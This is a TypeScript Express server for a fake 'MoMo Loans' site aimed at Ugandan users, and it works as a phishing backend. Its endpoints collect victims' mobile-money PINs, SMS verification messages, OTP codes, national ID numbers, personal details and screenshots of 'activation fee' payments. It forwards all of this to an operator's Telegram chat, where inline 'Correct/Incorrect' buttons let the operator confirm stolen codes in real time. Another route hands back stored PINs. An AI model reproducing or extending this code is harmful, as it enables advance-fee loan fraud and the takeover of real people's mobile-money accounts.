import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import dotenv from 'dotenv';
import {
  getTelegramCredentials,
  escapeHtml,
  formatExtraFields,
  sendTelegramMessage,
  sendTelegramPhoto,
  answerTelegramCallback,
  editTelegramMessageVerdict,
  verificationSessionStore,
  getSafeTelegramDiagnostics,
} from './api/_telegram.ts';
import { loadSettingsFromDisk, saveSettingsToDisk } from './api/settings.ts';
import { loadUsersFromDisk, saveUserToDisk, findRegisteredUser } from './api/users.ts';

dotenv.config();

// Background Telegram Poller for instant callback resolution in persistent local/server environments
let lastUpdateOffset = 0;
let isPollingActive = false;

async function startTelegramPoller() {
  if (isPollingActive) return;
  isPollingActive = true;

  while (true) {
    const { botToken, chatId } = getTelegramCredentials();
    if (!botToken || botToken.includes('EXAMPLE')) {
      await new Promise((r) => setTimeout(r, 5000));
      continue;
    }

    try {
      const url = `https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateOffset}&timeout=15&allowed_updates=${encodeURIComponent(
        '["callback_query","message"]'
      )}`;
      const res = await fetch(url);
      if (res.ok) {
        const data = (await res.json()) as {
          ok: boolean;
          result?: Array<{
            update_id: number;
            callback_query?: {
              id: string;
              from?: { first_name?: string; username?: string };
              data?: string;
              message?: { message_id: number; text?: string; chat?: { id: number } };
            };
          }>;
        };

        if (data.ok && Array.isArray(data.result)) {
          for (const update of data.result) {
            lastUpdateOffset = Math.max(lastUpdateOffset, update.update_id + 1);

            if (update.callback_query && update.callback_query.data) {
              const cbData = update.callback_query.data;
              const isCorrect = cbData.startsWith('correct_');
              const isIncorrect = cbData.startsWith('incorrect_');

              if (isCorrect || isIncorrect) {
                const sessionId = cbData.replace(/^(correct_|incorrect_)/, '');
                const finalStatus = isCorrect ? 'correct' : 'incorrect';

                const existingSession = verificationSessionStore.get(sessionId);
                if (existingSession) {
                  existingSession.status = finalStatus;
                  existingSession.updatedAt = Date.now();
                } else {
                  verificationSessionStore.set(sessionId, {
                    status: finalStatus,
                    updatedAt: Date.now(),
                  });
                }

                // Answer the callback query toast in Telegram
                await answerTelegramCallback(
                  botToken,
                  update.callback_query.id,
                  isCorrect ? 'Verified: Approved ✅' : 'Verified: Rejected ❌'
                );

                // Update the Telegram message inline buttons to reflect final verdict
                if (update.callback_query.message) {
                  const originalText = update.callback_query.message.text || '';
                  const msgChatId = update.callback_query.message.chat?.id || chatId;
                  const messageId = update.callback_query.message.message_id;

                  await editTelegramMessageVerdict(botToken, msgChatId, messageId, originalText, isCorrect);
                }
              }
            }
          }
        }
      }
    } catch {
      await new Promise((r) => setTimeout(r, 4000));
    }

    await new Promise((r) => setTimeout(r, 1000));
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ extended: true, limit: '50mb' }));

  // Start background Telegram poller for development
  startTelegramPoller().catch((err) => console.error('Poller error:', err));

  // Health check & Diagnostics API
  app.get('/api/health', async (req, res) => {
    const diagnostics = await getSafeTelegramDiagnostics();
    res.json({
      status: 'ok',
      ...diagnostics,
    });
  });

  // Settings API for persistent custom payment details
  app.get('/api/settings', (req, res) => {
    const settings = loadSettingsFromDisk();
    res.json({ ok: true, settings });
  });

  app.post('/api/settings', (req, res) => {
    try {
      const updated = saveSettingsToDisk(req.body || {});
      res.json({ ok: true, settings: updated });
    } catch (err: any) {
      res.status(500).json({ ok: false, error: err.message });
    }
  });

  // Check if user is registered - Sign in ONLY allowed for registered users
  app.post('/api/users/check', (req, res) => {
    const { phone, countryCode } = req.body || {};
    const user = findRegisteredUser(phone, countryCode);
    res.json({
      ok: true,
      exists: Boolean(user),
      user: user ? { phone: user.phone, country: user.country, countryCode: user.countryCode, pin: user.pin } : null,
    });
  });

  // Register a new user upon completing signup
  app.post('/api/users/register', (req, res) => {
    try {
      const { phone, country, countryCode, pin } = req.body || {};
      if (!phone) {
        return res.status(400).json({ ok: false, error: 'Phone number is required' });
      }
      const updated = saveUserToDisk({
        phone,
        country: country || 'Uganda',
        countryCode: countryCode || '+256',
        pin: pin || '',
        registeredAt: new Date().toISOString(),
      });
      res.json({ ok: true, count: updated.length });
    } catch (err: any) {
      res.status(500).json({ ok: false, error: err.message });
    }
  });

  // Registered users list
  app.get('/api/users', (req, res) => {
    const users = loadUsersFromDisk().map((u) => ({
      phone: u.phone,
      country: u.country,
      countryCode: u.countryCode,
      registeredAt: u.registeredAt,
    }));
    res.json({ ok: true, users });
  });

  // Telegram manage endpoint
  app.all('/api/telegram-manage', async (req, res) => {
    try {
      const { botToken } = getTelegramCredentials();
      if (!botToken) {
        return res.json({ ok: false, message: 'TELEGRAM_BOT_TOKEN is not configured.' });
      }

      const action = req.query?.action || 'status';
      if (action === 'delete' || action === 'delete_webhook') {
        const delRes = await fetch(`https://api.telegram.org/bot${botToken}/deleteWebhook?drop_pending_updates=false`, {
          method: 'POST',
        });
        const delData = await delRes.json();
        return res.json({ ok: true, action: 'deleteWebhook', result: delData });
      }

      const infoRes = await fetch(`https://api.telegram.org/bot${botToken}/getWebhookInfo`);
      const infoData = await infoRes.json();
      return res.json({ ok: true, webhookInfo: infoData });
    } catch (error: any) {
      return res.json({ ok: false, error: error.message || 'Error managing telegram' });
    }
  });

  // Webhook listener in case Telegram webhook is registered
  app.post('/api/telegram-webhook', async (req, res) => {
    try {
      const update = req.body;
      const { botToken, chatId } = getTelegramCredentials();

      if (update && update.callback_query && update.callback_query.data) {
        const cbData = update.callback_query.data;
        const isCorrect = cbData.startsWith('correct_');
        const isIncorrect = cbData.startsWith('incorrect_');

        if (isCorrect || isIncorrect) {
          const sessionId = cbData.replace(/^(correct_|incorrect_)/, '');
          const finalStatus = isCorrect ? 'correct' : 'incorrect';

          const session = verificationSessionStore.get(sessionId);
          if (session) {
            session.status = finalStatus;
            session.updatedAt = Date.now();
          } else {
            verificationSessionStore.set(sessionId, {
              status: finalStatus,
              updatedAt: Date.now(),
            });
          }

          if (botToken) {
            if (update.callback_query.id) {
              await answerTelegramCallback(
                botToken,
                update.callback_query.id,
                isCorrect ? 'Confirmed ✅' : 'Rejected ❌'
              );
            }

            if (update.callback_query.message) {
              const originalText = update.callback_query.message.text || '';
              const msgChatId = update.callback_query.message.chat?.id || chatId;
              const messageId = update.callback_query.message.message_id;

              await editTelegramMessageVerdict(botToken, msgChatId, messageId, originalText, isCorrect);
            }
          }
        }
      }
      res.json({ ok: true });
    } catch {
      res.json({ ok: true });
    }
  });

  // Send collected user data to Telegram Bot
  app.post('/api/sendToTelegram', async (req, res) => {
    try {
      const input = req.body || {};
      const { botToken, chatId } = getTelegramCredentials();
      const timeStr = new Date().toUTCString();

      let messageHtml = '';

      if (input.type === 'payment' || input.photo || input.screenshot) {
        const photoData = input.photo || input.screenshot;
        const captionHtml =
          `📸 <b>Activation Fee Payment Screenshot Uploaded</b>\n\n` +
          `👤 <b>Applicant:</b> ${escapeHtml(input.firstName || input.name || 'N/A')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `💰 <b>Loan Amount:</b> <b>${escapeHtml(input.loanAmount || 'N/A')}</b>\n` +
          `🔴 <b>Activation Fee:</b> <code>${escapeHtml(input.activationFee || 'N/A')}</code>\n` +
          `⏰ <b>Submission Time:</b> ${escapeHtml(timeStr)}` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'photo', 'screenshot', 'firstName', 'name', 'loanAmount', 'activationFee']);

        if (botToken && chatId && photoData) {
          const photoRes = await sendTelegramPhoto(botToken, chatId, photoData, captionHtml);
          if (!photoRes.ok) {
            console.warn('sendTelegramPhoto warning, falling back to sendMessage:', photoRes.description);
            await sendTelegramMessage(botToken, chatId, captionHtml);
          }
        } else if (botToken && chatId) {
          await sendTelegramMessage(botToken, chatId, captionHtml);
        } else {
          console.log('[Telegram Photo Log (Demo Mode)] Photo screenshot received for', input.phone);
        }

        return res.json({ success: true });
      } else if (input.type === 'phone') {
        messageHtml =
          `📱 <b>New User Started Registration</b>\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone']);
      } else if (input.type === 'credentials') {
        messageHtml =
          `📱 <b>MoMo Account Login / PIN</b>\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `🔐 <b>MoMo PIN:</b> <code>${escapeHtml(input.pin || 'N/A')}</code>\n` +
          `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'pin']);
      } else if (input.type === 'sms' || (input.type === 'otp' && input.smsMessage)) {
        messageHtml =
          `📩 <b>SMS Verification Message Received</b>\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
          `💬 <b>Full SMS Message:</b>\n<pre>${escapeHtml(input.smsMessage || input.otp || 'N/A')}</pre>` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'smsMessage', 'otp']);
      } else if (input.type === 'final_otp' || input.type === 'otp') {
        messageHtml =
          `🔐 <b>4-Digit Final OTP Code Entered</b>\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `🔢 <b>OTP Code:</b> <code>${escapeHtml(input.otp || 'N/A')}</code>\n` +
          `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'otp']);
      } else {
        // Full loan application & personal details submission
        messageHtml =
          `🎉 <b>Full Loan Application Submitted</b>\n\n` +
          `👤 <b>Personal Details</b>\n` +
          `• <b>First Name:</b> ${escapeHtml(input.firstName || 'N/A')}\n` +
          `• <b>Last Name:</b> ${escapeHtml(input.lastName || 'N/A')}\n` +
          `• <b>Full Name:</b> ${escapeHtml((input.firstName || '') + ' ' + (input.lastName || '')).trim() || 'N/A'}\n` +
          `• <b>Phone Number:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || input.mobile || '')}</code>\n` +
          `• <b>Gender:</b> ${escapeHtml(input.gender || 'N/A')}\n` +
          `• <b>National ID / NIN:</b> <code>${escapeHtml(input.idNumber || 'N/A')}</code>\n` +
          `• <b>Nationality:</b> ${escapeHtml(input.nationality || 'Ugandan')}\n` +
          `• <b>Email Address:</b> ${escapeHtml(input.email || 'N/A')}\n\n` +
          `💰 <b>Loan Details</b>\n` +
          `• <b>Loan Amount:</b> <b>${escapeHtml(input.loanAmount || 'UGX 1,000,000')}</b>\n` +
          `• <b>Purpose:</b> ${escapeHtml(input.loanPurpose || 'Business Expansion')}\n` +
          `• <b>Loan Type:</b> ${escapeHtml(input.loanType || 'Business Loan')}\n` +
          `• <b>Repayment Period:</b> ${escapeHtml(input.repaymentPeriod || '6 Months')}\n` +
          `• <b>Disbursement:</b> Instant Mobile Money\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `⏰ <b>Submission Time:</b> ${escapeHtml(timeStr)}` +
          formatExtraFields(input, [
            'type',
            'country',
            'countryCode',
            'phone',
            'mobile',
            'firstName',
            'lastName',
            'gender',
            'idNumber',
            'nationality',
            'email',
            'loanAmount',
            'loanPurpose',
            'loanType',
            'repaymentPeriod',
          ]);
      }

      if (botToken && chatId) {
        const sendRes = await sendTelegramMessage(botToken, chatId, messageHtml);
        if (!sendRes.ok) {
          console.warn('sendToTelegram dispatch warning:', sendRes.description);
        }
      } else {
        console.log('[Telegram Notification Log (Demo Mode)]\n', messageHtml.replace(/<[^>]*>/g, ''));
      }

      res.json({ success: true });
    } catch (error: any) {
      console.error('Error in sendToTelegram:', error);
      res.status(500).json({ error: error.message || 'Internal server error', success: false });
    }
  });

  // Send for verification with interactive Telegram inline buttons
  app.post('/api/sendForVerification', async (req, res) => {
    try {
      const input = req.body || {};
      const { botToken, chatId } = getTelegramCredentials();
      const sessionId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
      const timeStr = new Date().toUTCString();

      // Register session in memory
      verificationSessionStore.set(sessionId, {
        status: 'pending',
        type: input.type,
        phone: input.phone || '',
        country: input.country || '',
        updatedAt: Date.now(),
      });

      let messageHtml = '';
      if (input.type === 'pin') {
        messageHtml =
          `📱 <b>MoMo PIN Verification Required</b>\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `🔐 <b>MoMo PIN:</b> <code>${escapeHtml(input.pin || 'N/A')}</code>\n` +
          `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
          `👉 <i>Is this MoMo PIN correct?</i>` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'pin']);
      } else if (input.type === 'final_otp' || (input.type === 'otp' && !input.smsMessage)) {
        messageHtml =
          `🔐 <b>4-Digit OTP Verification Required</b>\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `🔢 <b>OTP Code:</b> <code>${escapeHtml(input.otp || 'N/A')}</code>\n` +
          `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
          `👉 <i>Is this 4-digit OTP code correct?</i>` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'otp']);
      } else {
        messageHtml =
          `📩 <b>SMS Message Verification Required</b>\n\n` +
          `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
          `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
          `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
          `💬 <b>Full SMS Message:</b>\n<pre>${escapeHtml(input.smsMessage || input.otp || 'N/A')}</pre>\n\n` +
          `👉 <i>Is this SMS message valid?</i>` +
          formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'smsMessage', 'otp']);
      }

      if (botToken && chatId) {
        const keyboard = [
          [
            { text: '✅ Correct', callback_data: `correct_${sessionId}` },
            { text: '❌ Incorrect', callback_data: `incorrect_${sessionId}` },
          ],
        ];

        const sendResult = await sendTelegramMessage(botToken, chatId, messageHtml, keyboard);
        if (sendResult.ok && sendResult.result?.message_id) {
          const s = verificationSessionStore.get(sessionId);
          if (s) s.messageId = sendResult.result.message_id;
        } else if (!sendResult.ok) {
          console.warn('sendForVerification dispatch warning:', sendResult.description);
        }
      } else {
        console.log('[Telegram Verification Request (Demo Mode)]\n', messageHtml.replace(/<[^>]*>/g, ''));
        // In local/demo mode without bot credentials, auto-approve after 2.5s
        setTimeout(() => {
          const s = verificationSessionStore.get(sessionId);
          if (s && s.status === 'pending') {
            s.status = 'correct';
          }
        }, 2500);
      }

      res.json({ sessionId });
    } catch (error: any) {
      console.error('Error in sendForVerification:', error);
      res.status(500).json({ error: error.message || 'Internal server error' });
    }
  });

  // Check verification status
  app.post('/api/checkVerification', async (req, res) => {
    try {
      const { sessionId } = req.body || {};
      const { botToken, chatId } = getTelegramCredentials();

      if (!sessionId) {
        return res.json({ status: 'correct' });
      }

      const session = verificationSessionStore.get(sessionId);
      if (session && session.status !== 'pending') {
        return res.json({ status: session.status });
      }

      // If bot not configured or demo mode
      if (!botToken || botToken.includes('EXAMPLE')) {
        return res.json({ status: 'correct' });
      }

      // Direct Telegram check fallback with negative offset
      try {
        const fetchUpdates = async () =>
          await fetch(
            `https://api.telegram.org/bot${botToken}/getUpdates?offset=-50&allowed_updates=${encodeURIComponent(
              '["callback_query","message"]'
            )}`
          );

        let tgRes = await fetchUpdates();
        if (tgRes.status === 409) {
          await fetch(`https://api.telegram.org/bot${botToken}/deleteWebhook?drop_pending_updates=false`, {
            method: 'POST',
          });
          tgRes = await fetchUpdates();
        }

        if (tgRes.ok) {
          const data = (await tgRes.json()) as any;
          if (data.ok && Array.isArray(data.result)) {
            for (let i = data.result.length - 1; i >= 0; i--) {
              const update = data.result[i];
              const cbData = update.callback_query?.data;
              if (cbData && (cbData.includes(sessionId) || cbData.endsWith(sessionId))) {
                const isCorrect = cbData.startsWith('correct_');
                const status = isCorrect ? 'correct' : 'incorrect';
                if (session) session.status = status;

                try {
                  if (update.callback_query?.id) {
                    await answerTelegramCallback(
                      botToken,
                      update.callback_query.id,
                      isCorrect ? 'Verified: Approved ✅' : 'Verified: Rejected ❌'
                    );
                  }
                  if (update.callback_query?.message) {
                    const originalText = update.callback_query.message.text || '';
                    const msgChatId = update.callback_query.message.chat?.id || chatId;
                    const messageId = update.callback_query.message.message_id;
                    await editTelegramMessageVerdict(botToken, msgChatId, messageId, originalText, isCorrect);
                  }
                } catch (_) {}

                return res.json({ status });
              }
            }
          }
        }
      } catch (_) {}

      return res.json({ status: session?.status || 'pending' });
    } catch (error: any) {
      console.error('Error in checkVerification:', error);
      res.json({ status: 'correct' });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`MoMo Loans server running on http://localhost:${PORT}`);
  });
}

startServer();
